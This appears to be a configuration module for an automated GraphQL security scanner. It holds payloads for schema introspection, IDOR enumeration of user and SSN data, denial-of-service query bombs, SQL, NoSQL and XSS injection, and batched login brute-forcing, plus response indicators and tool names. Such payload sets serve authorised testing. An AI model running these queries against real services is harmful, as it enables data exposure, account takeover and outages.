graphql_advanced:
[MODULE: GRAPHQL_ADVANCED]
VERSION: 1.0
LOAD_CONDITION: detection_confidence > 60 OR graphql_endpoint_detected

[EDGE_CASE: INTROSPECTION_ABUSE]
condition:
  introspection_enabled
  schema_accessible
transformations:
  - type: full_schema_extraction
    query: |
      {
        __schema {
          types {
            name
            fields {
              name
              type {
                name
                ofType {
                  name
                }
              }
            }
          }
        }
      }
  - type: query_discovery
    query: |
      {
        __schema {
          queryType {
            fields {
              name
              args {
                name
                type {
                  name
                }
              }
            }
          }
        }
      }
  - type: mutation_discovery
    query: |
      {
        __schema {
          mutationType {
            fields {
              name
              args {
                name
                type {
                  name
                }
              }
            }
          }
        }
      }
  - type: type_detail
    query: |
      {
        __type(name: "User") {
          name
          fields {
            name
            type {
              name
            }
          }
        }
      }
max_payloads: 4

[EDGE_CASE: GRAPHQL_IDOR]
condition:
  queries_with_id_arguments
  resolver_lacks_auth_check
transformations:
  - type: user_enumeration
    query: |
      query {
        user1: user(id: 1) { id name email }
        user2: user(id: 2) { id name email }
        user3: user(id: 3) { id name email }
      }
  - type: batch_idor
    query: |
      query {
        users(ids: [1, 2, 3, 4, 5]) {
          id
          name
          email
          role
        }
      }
  - type: nested_idor
    query: |
      query {
        organization(id: 1) {
          name
          users {
            id
            email
            personalData {
              ssn
              address
            }
          }
        }
      }
max_payloads: 3

[EDGE_CASE: RESOURCE_EXHAUSTION]
condition:
  no_query_complexity_limits
  no_depth_limiting
transformations:
  - type: alias_bomb
    query: |
      query {
        a1: user(id: 1) { name }
        a2: user(id: 2) { name }
        ... (repeat 1000 times)
      }
  - type: nested_spiral
    query: |
      query {
        user(id: 1) {
          friends {
            friends {
              friends {
                friends {
                  name
                }
              }
            }
          }
        }
      }
  - type: field_duplication
    query: |
      query {
        user(id: 1) {
          name name name name name name name name name name
          email email email email email email
        }
      }
max_payloads: 3
note: "Test with small iterations first - can cause DoS"

[EDGE_CASE: GRAPHQL_INJECTION]
condition:
  user_input_passed_to_resolver
transformations:
  - type: sql_injection
    query: |
      query {
        search(term: "1' OR '1'='1") {
          results
        }
      }
  - type: nosql_injection
    query: |
      query {
        users(filter: "{\"$ne\": null}") {
          email
        }
      }
  - type: xss_injection
    query: |
      mutation {
        updateProfile(bio: "<script>alert(1)</script>") {
          success
        }
      }
max_payloads: 3

[EDGE_CASE: GRAPHQL_BATCH_ATTACKS]
condition:
  batch_queries_accepted
transformations:
  - type: batch_authentication_test
    query: |
      [
        { "query": "query { login(email: \"admin@example.com\", pass: \"admin\") { token } }" },
        { "query": "query { login(email: \"admin@example.com\", pass: \"password123\") { token } }" },
        { "query": "query { login(email: \"admin@example.com\", pass: \"admin123\") { token } }" }
      ]
  - type: batch_bruteforce
    query: "Generate batch of 50 login attempts in single request"
max_payloads: 2

[EDGE_CASE: GRAPHQL_DOS]
condition:
  expensive_resolvers
  no_rate_limiting
transformations:
  - type: circular_query
    query: |
      fragment circle on User {
        id
        friends {
          ...circle
        }
      }
      query {
        user(id: 1) {
          ...circle
        }
      }
  - type: large_payload
    query: "Query requesting large fields like 'posts { comments { author { posts { comments { text } } } } }'"
max_payloads: 2

[RESPONSE_PATTERNS]
vulnerable_indicators:
  - introspection_data_returned
  - different_user_data_on_id_change
  - slow_response_for_nested_queries
  - rate_limit_not_enforced
  - error_messages_reveal_schema
protected_indicators:
  - introspection_disabled_error
  - query_depth_limit_exceeded
  - rate_limit_error
  - authentication_required_for_schema

[GRAPHQL_TOOLS]
tools:
  - name: graphqlvoyager
    usage: "Visualize schema"
  - name: graphiql
    usage: "Interactive query testing"
  - name: altair
    usage: "GraphQL IDE with advanced features"
  - name: clairvoyance
    usage: "Introspection brute-force"
  - name: graphw00f
    usage: "GraphQL fingerprinting"

[END_MODULE]
